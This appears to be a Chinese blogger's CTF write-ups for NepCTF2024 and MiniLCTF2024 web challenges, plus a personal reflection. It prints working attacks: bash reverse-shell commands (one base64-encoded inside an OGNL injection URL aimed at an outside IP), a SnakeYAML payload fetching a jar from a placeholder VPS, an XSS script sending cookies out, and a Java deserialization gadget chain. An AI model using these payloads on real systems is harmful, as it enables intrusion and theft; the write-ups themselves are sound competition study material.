class="hljs-built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</code></pre></div><p><img src="/../images/NepCTF2024-web/image-20240829012725881.png" alt="image-20240829012725881"></p><p><img src="/../images/NepCTF2024-web/image-20240829012817375.png" alt="image-20240829012817375"></p><p>使用<code>python3 -m http.server 3333</code>开启http服务，把blood-pool-HRP下载下来</p><p><img src="/../images/NepCTF2024-web/image-20240829182023791.png" alt="image-20240829182023791"></p><p>mysql无法直接用会报错</p><p>于是使用python去查询数据库</p><p><img src="/../images/NepCTF2024-web/image-20240829161214722.png" alt="image-20240829161214722"></p><p>使用<code>pip list</code>可以查看已安装的库，其中就存在<code>mysql-connector-python</code></p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> mysql.connector;connection = mysql.connector.connect(host=<span class="hljs-string">&quot;localhost&quot;</span>,user=<span class="hljs-string">&quot;root&quot;</span>,password=<span class="hljs-string">&quot;Nep+-*/HRP123456789&quot;</span>,database=<span class="hljs-string">&quot;TradeSecrets&quot;</span>);cursor = connection.cursor();query = <span class="hljs-string">&quot;SELECT * from flag&quot;</span>;cursor.execute(query);results = cursor.fetchall();<span class="hljs-built_in">print</span>(results);cursor.close();connection.close()</code></pre></div><p><img src="/../images/NepCTF2024-web/image-20240829012603545.png" alt="image-20240829012603545"></p><h2 id="PHP-MASTER"><a href="#PHP-MASTER" class="headerlink" title="PHP_MASTER"></a>PHP_MASTER</h2><p><a href="https://writeup.owo.show/lan-qiao-bei-2023#ezphp">https://writeup.owo.show/lan-qiao-bei-2023#ezphp</a></p><p>原题，两处小变动</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>( <span class="hljs-keyword">__FILE__</span>);<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;key=== <span class="hljs-string">&quot;\0key\0&quot;</span>)&#123;            <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>];            <span class="hljs-variable">$contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>);            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$contents</span>);        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>]))&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);        &#125;        <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep1&#x27;</span>].<span class="hljs-string">&quot;[welcome to&quot;</span>. <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>].<span class="hljs-string">&quot;CTF]&quot;</span>);        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$str</span>===<span class="hljs-string">&#x27;NepCTF]&#x27;</span>)&#123;            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;b) ();        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;s = <span class="hljs-variable">$s</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span> -&gt;str;    &#125;&#125;<span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]));<span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-string">&quot;00&quot;</span>,<span class="hljs-variable">$ser</span>);<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);</code></pre></div><p>然后</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);&#125;</code></pre></div><p>思路是使<code>$end-1-$start</code>为负数，使得提取的内容能被nep1控制</p><p>经过测试<code>]1231231231231[NepCTF]</code>即可</p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>phpinfo查看环境变量</p><p><img src="/../images/NepCTF2024-web/image-20240829021327795.png" alt="image-20240829021327795"></p><h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>就像原题中的用大写<code>S</code>解析<code>\00</code>从而避免后面被替换</p><div class="code-wrapper"><pre><code class="hljs autoit">$a = $_POST[1]<span class="hljs-comment">;</span>$contents = file_get_contents($a)<span class="hljs-comment">;</span>file_put_contents($a, $contents)<span class="hljs-comment">;</span></code></pre></div><p>接着通过这些代码尝试进行rce</p><p>其实我思考了一会就想要尝试filterchain去覆盖index.php</p><p>但是我一打发现服务崩掉了</p><p>赛后发现就是预期解</p><p>复现时尝试了几个马都不行，甚至phpinfo会导致服务宕机</p><p>经过多次测试发现php_filter_chain_generator生成的payload第一次的编码不是普通的base64，所以可能导致后面构造字符出现问题</p><p>解决方法就是先进行一次base64加密，然后再使用生成的payload</p><p><img src="/../images/NepCTF2024-web/image-20240829034947801.png" alt="image-20240829034947801"></p><h2 id="Always-RCE-First"><a href="#Always-RCE-First" class="headerlink" title="Always RCE First"></a>Always RCE First</h2><p>看附件</p><p><img src="/../images/NepCTF2024-web/image-20240829181005026.png" alt="image-20240829181005026"></p><p>很容易找到对应的CVE-2024-37084</p><p>但是不好搜索到对应的poc</p><p>实际上已经有了<a href="https://forum.butian.net/article/513">https://forum.butian.net/article/513</a></p><p>根据文章复现即可</p><div class="code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-number">1.0</span><span class="hljs-number">.0</span><span class="hljs-attr">origin:</span> <span class="hljs-string">my</span> <span class="hljs-string">origin</span><span class="hljs-attr">repositoryId:</span> <span class="hljs-number">12345</span><span class="hljs-attr">repositoryName:</span> <span class="hljs-string">local</span><span class="hljs-attr">kind:</span> <span class="hljs-type">!!javax.script.ScriptEngineManager</span> [<span class="hljs-type">!!java.net.URLClassLoader</span> [[<span class="hljs-type">!!java.net.URL</span> [<span class="hljs-string">&quot;http://vps_ip:port/yaml-payload.jar&quot;</span>]]]]<span class="hljs-attr">name:</span> <span class="hljs-string">test1</span><span class="hljs-attr">version:</span> <span class="hljs-number">1.1</span><span class="hljs-number">.1</span></code></pre></div><p>脚本转换得到 <code>packageFileAsBytes</code></p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test-1.1.1.zip&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:    zip_data = file.read()<span class="hljs-built_in">print</span>([byte <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> zip_data])</code></pre></div><div class="code-wrapper"><pre><code class="hljs awk">javac src<span class="hljs-regexp">/artsploit/</span>AwesomeScriptEngineFactory.javajar -cvf yaml-payload.jar -C src/ .</code></pre></div><p>注意要使用1.8.0_202版本的<code>javac</code>和<code>jar</code></p><p><img src="/../images/NepCTF2024-web/image-20240829181248389.png" alt="image-20240829181248389"></p><p><img src="/../images/NepCTF2024-web/image-20240829181721960.png" alt="image-20240829181721960"></p><p><img src="/../images/NepCTF2024-web/image-20240829180721758.png" alt="image-20240829180721758"></p><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>同样是<code>/api/package/upload</code>的上传功能</p><p>能够进行目录穿越进行文件覆盖，从而进行RCE</p><p>可以通过覆盖charsets.jar进行RCE</p><p><a href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks">https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks</a></p><p><img src="/../images/NepCTF2024-web/image-20240829212409931.png" alt="image-20240829212409931"></p><p>把charsets.jar打包成zip</p><p>同样用脚本转换得到 <code>packageFileAsBytes</code></p><p>上传功能详细请看文章<a href="https://blog.securelayer7.net/spring-cloud-data-flow-exploit/">CVE-2024-22263: Spring Cloud Dataflow Arbitrary File Writing - SecureLayer7 - Offensive Security, API Scanner &amp; Attack Surface Management</a></p><p><img src="/../images/NepCTF2024-web/image-20240829210304571.png" alt="image-20240829210304571"></p><p>会在lib同目录下生成<code>lib-version.zip</code></p><p><img src="/../images/NepCTF2024-web/image-20240829205503420.png" alt="image-20240829205503420"></p><p>然后会解压zip文件到lib目录下</p><p><img src="/../images/NepCTF2024-web/image-20240829205349557.png" alt="image-20240829205349557"></p><p>然后Accept请求头中指定<code>charset</code>加载<code>charsets.jar</code>，成功进行rce</p><p><img src="/../images/NepCTF2024-web/image-20240829211651941.png" alt="image-20240829211651941"></p><p>要注意只能指定一次，因为charsets.jar只会被加载一次</p><p><img src="/../images/NepCTF2024-web/image-20240829212009581.png" alt="image-20240829212009581"></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://chenxi9981.github.io/NepCTF_2024/">NepCTF 2024 | 晨曦的个人小站 (chenxi9981.github.io)</a></p><p><a href="https://www.yuque.com/ph0ebus/writeups/cocyh6qewfx6ftkp#">NepCTF2024 (yuque.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MiniLCTF2024</title>
    <link href="/2024/05/01/MiniLCTF2024/"/>
    <url>/2024/05/01/MiniLCTF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="MiniL2024"><a href="#MiniL2024" class="headerlink" title="MiniL2024"></a>MiniL2024</h1><p>遗憾没能重现lolita荣光</p><h2 id="Snooker-King"><a href="#Snooker-King" class="headerlink" title="Snooker King"></a>Snooker King</h2><p>看到打进球后控制台有打印，跟过去</p><p><img src="/../images/MiniLCTF2024/image-20240430194915528.png" alt="image-20240430194915528"></p><p>没思路，跟一步一步走</p><p><img src="/../images/MiniLCTF2024/image-20240430194946559.png" alt="image-20240430194946559"></p><p>然后看到跟score有关，进去看看holdManager有啥，结果走运翻出了flag</p><p><img src="/../images/MiniLCTF2024/image-20240430194958080.png" alt="image-20240430194958080"></p><h2 id="Jvav-Guy-（一血）"><a href="#Jvav-Guy-（一血）" class="headerlink" title="Jvav Guy （一血）"></a>Jvav Guy （一血）</h2><p>扫目录，Actuator泄露，下载并分析heapdump</p><p>我从后往前读，发现有另一个页面的登录密码，登上去没用，往前看到了shirokey</p><p>由于前不久被这个坑了（虽然当时并没做到那一步），所以直接尝试打shiro</p><p><img src="/../images/MiniLCTF2024/image-20240430195541287.png" alt="image-20240430195541287"></p><p>于是尝试一把梭哈，由于不知道路径（虽然heapdump中有，但是我看那名称感觉奇奇怪怪的</p><p>于是上了个马</p><p><img src="/../images/MiniLCTF2024/image-20240430195518564.png" alt="image-20240430195518564"></p><h2 id="HiddenSignin"><a href="#HiddenSignin" class="headerlink" title="HiddenSignin"></a>HiddenSignin</h2><blockquote><p>The First Key is…</p><p>65536&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;洰驦栶椶昳湥顥氳椸洸汣敥鬹渳止敦騲驤攷騰昷朶杤湤氳阶氱橡止杤湣騷&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;65536</p></blockquote><p>base65536解密</p><p><img src="/../images/MiniLCTF2024/image-20240502173607517.png" alt="image-20240502173607517"></p><p>拿去挂载，得到keyinside.png</p><p>翻通道发现第二个key</p><p><img src="/../images/MiniLCTF2024/image-20240502172617918.png" alt="image-20240502172617918"></p><p>继续挂载，得到flag.txt</p><p>发现零宽，直接隐写</p><p><img src="/../images/MiniLCTF2024/image-20240502173628244.png" alt="image-20240502173628244"></p><p>这里由于之前当我成功得到图片之后不知道咋做，于是看了下磁盘，那个也有recycle.bin</p><p>所以看到这里提示时，直接再次磁盘取证，得到flag</p><p><img src="/../images/MiniLCTF2024/image-20240502174547196.png" alt="image-20240502174547196"></p><p><img src="/../images/MiniLCTF2024/image-20240502173053931.png" alt="image-20240502173053931"></p><h2 id="SmartPark"><a href="#SmartPark" class="headerlink" title="SmartPark"></a>SmartPark</h2><p>扫目录，得到swagger</p><p>于是直接新建账户，然后登录，拿到Authorization，就可以请求backup</p><p>问题可能在于新建账户有正则匹配，用户名6位以上，密码8位以上</p><p>审计代码，思路明确，目标清晰，go的ssti</p><p>前不久HGAME以及翻晨曦师傅博客看到过</p><p>同时也网上找了几篇文章，刚开始被一篇文章误导了（也不是误导，题目框架不同），就想着直接<code>c.File</code>下载文件</p><p>但又看了几篇就排除了这个做法，能调用的东西跟传进去的结构体有关</p><p><img src="/../images/MiniLCTF2024/image-20240503145613328.png" alt="image-20240503145613328"></p><p>例如这里<code>teml.Execute(c.Writer,f)</code>传入的是f，也就是<code>FastQuery</code>结构体</p><p>所以能调用的函数只有<code>DbCall</code>，可以执行任意pg_sql命令</p><p>做到这里时仍是零解，但我问了下出题人flag在不在数据库中，他说不在</p><p>由于打数据库做的比较少加上我的理解有误，我就没往<code>DbCall</code>这方面想了</p><p>然后经过一天多的折磨（期间陆续有人解出），最后去问了下出题人，思路回到打数据库</p><p>最后只能含泪打数据库读取文件</p><p>但是普通select查询成功会显示<code>no value</code></p><p>好不容易找到一个能回显的</p><p><img src="/../images/MiniLCTF2024/image-20240502220116487.png" alt="image-20240502220116487"></p><p>读取<code>/flag</code>，提示在env中，直接<code>/proc/1/environ</code>（因为<code>/proc/self/environ</code>没有东西）</p><p><img src="/../images/MiniLCTF2024/image-20240502220035011.png" alt="image-20240502220035011"></p><h2 id="SmartPark-Revenge-（二血）"><a href="#SmartPark-Revenge-（二血）" class="headerlink" title="SmartPark-Revenge （二血）"></a>SmartPark-Revenge （二血）</h2><p>不知道上题了，手慢了，做法同上</p><h3 id="revenge的修补"><a href="#revenge的修补" class="headerlink" title="revenge的修补"></a>revenge的修补</h3><p>修的是另一处的pg_sql注入</p><p>别人sqlmap一把梭哈了，woc</p><p>但他的是登录界面梭哈</p><p>我认为这也可以吧</p><p><img src="/../images/MiniLCTF2024/image-20240503150740824.png" alt="image-20240503150740824"></p><p>describe没经过检查拼接进了sql语句</p><p>当时没思路时也想到过这里，但我就是不想打数据库，所以没打</p><h2 id="InjectionS-一血"><a href="#InjectionS-一血" class="headerlink" title="InjectionS (一血)"></a>InjectionS (一血)</h2><p>spring secruity绕过</p><p>mybatis的动态SQL，造成的OGNL注入</p><div class="code-wrapper"><pre><code class="hljs coffeescript">http:<span class="hljs-regexp">//47.113.202.32:8080/admin/</span>$&#123;@java.lang.Runtime@getRuntime().exec(<span class="hljs-keyword">new</span> java.lang.<span class="hljs-built_in">String</span>(@java.util.Base64@getDecoder().decode(<span class="hljs-string">&#x27;YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TVRndU9Ea3VOakV1TnpFdk56YzNOeUF3UGlZeH18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9&#x27;</span>)))&#125;%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A</code></pre></div><p>一把梭，秒了</p><p><img src="/../images/MiniLCTF2024/image-20240504001959147.png" alt="image-20240504001959147"></p><h2 id="Laughing-Knife-No-Running"><a href="#Laughing-Knife-No-Running" class="headerlink" title="Laughing-Knife-No-Running"></a>Laughing-Knife-No-Running</h2><p>刚开始动太多了，老是cheating，几天后想到那就符合要求来不就行了</p><p>每次移动不超过100米</p><p>经度100米0.001141°</p><p>纬度100米0.000899°</p><p>慢慢摁吧</p><p><img src="/../images/MiniLCTF2024/image-20240504183127085.png" alt="image-20240504183127085"></p><p><img src="/../images/MiniLCTF2024/image-20240504183135013.png" alt="image-20240504183135013"></p><h2 id="Msgbox-（看他人wp）"><a href="#Msgbox-（看他人wp）" class="headerlink" title="Msgbox  （看他人wp）"></a>Msgbox  （看他人wp）</h2><p>xss 由于nonce每次都是随机生成</p><p>大概思路就是css inject</p><p>应该是可以的，但是发现请求不了css文件，不会</p><p>出题人说css其实没啥用，题目描述可以不用vps</p><p>不会</p><p><img src="/../images/MiniLCTF2024/image-20240509221144627.png" alt="image-20240509221144627"></p><p>由于可以加载<code>cdn.jsdelivr.net</code>的文件</p><p>我们可以往这上面传文件，然后script的src指定这个文件</p><p>这样就不需要nonce</p><p>根本就不知道能够上传上去（呜呜</p><blockquote><p>我们可以想办法把自己的 js 传到 cdn.jsdelivr.net 上。</p><p>实际上它有一个 Github 资源的镜像，只要在自己 Github 仓库上传这个 js，然后发 release，就可以用下面的链接访问文件：</p><div class="code-wrapper"><pre><code class="hljs Plain">https://cdn.jsdelivr.net/gh/&lt;username&gt;/&lt;repo name&gt;@&lt;tag&gt;/&lt;resource name&gt;</code></pre></div></blockquote><p>恶意js代码（写信给注册的用户）</p><div class="code-wrapper"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;DOMContentLoaded&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/send&#x27;</span>, &#123; <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-attr">credentials</span>: <span class="hljs-string">&#x27;include&#x27;</span>, <span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span> &#125;, <span class="hljs-attr">body</span>: <span class="hljs-string">&#x27;header=Captured+Flag&amp;listener=注册的用户名&amp;content=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> &#125;) .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>()) .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data)) .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, error)); &#125;);</code></pre></div><p>他人结果</p><p><img src="/../images/MiniLCTF2024/image-20240509222036175.png" alt="image-20240509222036175"></p><h2 id="ezjaba-（赛后）"><a href="#ezjaba-（赛后）" class="headerlink" title="ezjaba （赛后）"></a>ezjaba （赛后）</h2><p>出网就会    ldapAttribute + ldap高版本绕过</p><p>不出网，给了点提示，fastjson1.2.60以及原生反序列化黑名单实现原理有一个trick</p><p>这里给一下实现代码，具体trick原理会出个文章讲解一下</p><p>第一次打会找不到构造函数，多打几次就行了</p><div class="code-wrapper"><pre><code class="hljs reasonml">import com.alibaba.fastjson.JSONArray;import com.alibaba.fastjson.JSONObject;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javax.management.BadAttributeValueExpException;import javax.swing.event.EventListenerList;import javax.swing.undo.UndoManager;import java.io.*;import java.lang.reflect.*;import java.security.*;import java.util.*;public <span class="hljs-keyword">class</span> bad_gadget &#123;    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;        ArrayList&lt;Object&gt; list1 = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;<span class="hljs-literal">()</span>;        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;<span class="hljs-comment">//内存马文件</span>        byte<span class="hljs-literal">[]</span> bytecodes = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Files</span>.</span></span>read<span class="hljs-constructor">AllBytes(Paths.<span class="hljs-params">get</span>(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;</span>)</span>);        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>)</span>;        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][] &#123;<span class="hljs-params">bytecodes</span>&#125;)</span>;        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);        list1.add(templatesimpl);        JSONArray jo = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JSONArray()</span>;        jo.add(templatesimpl);        BadAttributeValueExpException exp = <span class="hljs-keyword">new</span> <span class="hljs-constructor">BadAttributeValueExpException(1)</span>;        Field <span class="hljs-keyword">val</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;val&quot;</span>)</span>;        <span class="hljs-keyword">val</span>.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        <span class="hljs-keyword">val</span>.set(exp,jo);        list1.add(exp);        KeyPairGenerator keyPairGenerator;        keyPairGenerator = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">KeyPairGenerator</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-string">&quot;DSA&quot;</span>)</span>;        keyPairGenerator.initialize(<span class="hljs-number">1024</span>);        KeyPair keyPair = keyPairGenerator.gen<span class="hljs-constructor">KeyPair()</span>;        PrivateKey privateKey = keyPair.get<span class="hljs-constructor">Private()</span>;        Signature signingEngine = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Signature</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-string">&quot;DSA&quot;</span>)</span>;        SignedObject signedObject = <span class="hljs-keyword">new</span> <span class="hljs-constructor">SignedObject(<span class="hljs-params">list1</span>,<span class="hljs-params">privateKey</span>,<span class="hljs-params">signingEngine</span>)</span>;        JSONArray jo1 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JSONArray()</span>;        jo1.add(signedObject);        EventListenerList <span class="hljs-built_in">list</span> = <span class="hljs-keyword">new</span> <span class="hljs-constructor">EventListenerList()</span>;        UndoManager manager = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UndoManager()</span>;        Vector vector = (Vector) get<span class="hljs-constructor">FieldValue(<span class="hljs-params">manager</span>, <span class="hljs-string">&quot;edits&quot;</span>)</span>;        vector.add(jo1);        set<span class="hljs-constructor">Value(<span class="hljs-params">list</span>, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-params">new</span> Object[]&#123;InternalError.<span class="hljs-params">class</span>, <span class="hljs-params">manager</span>&#125;)</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(serial(<span class="hljs-built_in">list</span>));    &#125;    public static String serial(Object o) throws IOException &#123;        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;        ObjectOutputStream oos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">baos</span>)</span>;        oos.write<span class="hljs-constructor">UTF(<span class="hljs-string">&quot;rO0AAw&quot;</span>)</span>;        oos.write<span class="hljs-constructor">Object(<span class="hljs-params">o</span>)</span>;        oos.close<span class="hljs-literal">()</span>;        String base64String = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">baos</span>.<span class="hljs-params">toByteArray</span>()</span>);        return base64String;    &#125;    public static void set<span class="hljs-constructor">Value(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">name</span>, Object <span class="hljs-params">value</span>)</span> throws Exception&#123;        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">name</span>)</span>;        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        field.set(obj, value);    &#125;&#125;</code></pre></div><p><img src="/../images/MiniLCTF2024/image-20240508001209340.png" alt="image-20240508001209340"></p><h2 id="回顾与反思"><a href="#回顾与反思" class="headerlink" title="回顾与反思"></a>回顾与反思</h2><p>其实这篇我想写的不是wp，而是这个总结</p><p>MiniL虽然不是接触CTF的开始，但却是我努力学习CTF的开始</p><p>去年虽然成功加入工作室，但因为没有好的学习方法，没有请教的人等原因，导致在去年2，3，4月都十分的摆烂，也不是不学，但也只是一直在看wp，以为这样能接触的快一点，但实际上不刷题，不知道学什么都是让我停滞不前的原因</p><p>于是去年的五一我像往常一样打起了师兄发在群里的MiniL，这次不同于以往的比赛，可能是由于时间比较长还是什么原因，我莫名的想要打出一点成绩，但是很快现实就给了我迎头一击</p><p>经过两三天的挣扎才勉强做出web的签到题，而且还不是预期的方法，然后便没有后续了</p><p>但是与此同时，Lolita大佬在此大杀四方，AK了web题目（几乎都是一二血）</p><p>在赛后开始请教Lolita大佬（此前除了一次组队比赛外没有任何联系）</p><p>也是在那之后，我遇到一些困难但是不是邪门的问题，我都会去请教Lolita大佬（直到现在），简直就像个百科全书</p><p>赛后看到西电的一个师傅的文章中写道很羡慕lolita这么强，他连java还不太会</p><p>我当时看到就励志我大二一定不会像他一样（仅仅是java，不是说贬低那位师傅，他也Ak了web，只是想说明给了我挺大的动力）</p><p>因此那次MiniL后开始了往返工位与宿舍之间的生活，虽然付出了时间，但是我能清晰地知道我学习的效率并不高，在痛苦之间挣扎着</p><p>现在突然发现，我的大二生涯随着成电招新赛、杭电招新赛、西电招新赛的结束，好像马上要落下帷幕</p><p>今年的MiniL我斗志满满，看看能否再现lolita的荣光，前几天虽然经过一些挣扎，但还是比较顺利的</p><p>直到ezjaba的出现（去年因为某种原因下架的0解题），询问了出题人之后才知道不出网</p><p>至此梦碎了</p><p>5月5号晚上，看着许久未变的0解题突然变成两解，我心态崩了</p><p>一看名字好像都是杭电的，我第一时间想的是他们肯定去问1ue了（出题人跟我说1ue还真跟他讨论了）</p><p>但是又怎么样呢，我就是菜</p><p>然后看着总榜前三的杭电、成电那些熟悉的年轻的名字</p><p>Fanllspd，leukocyte，z221x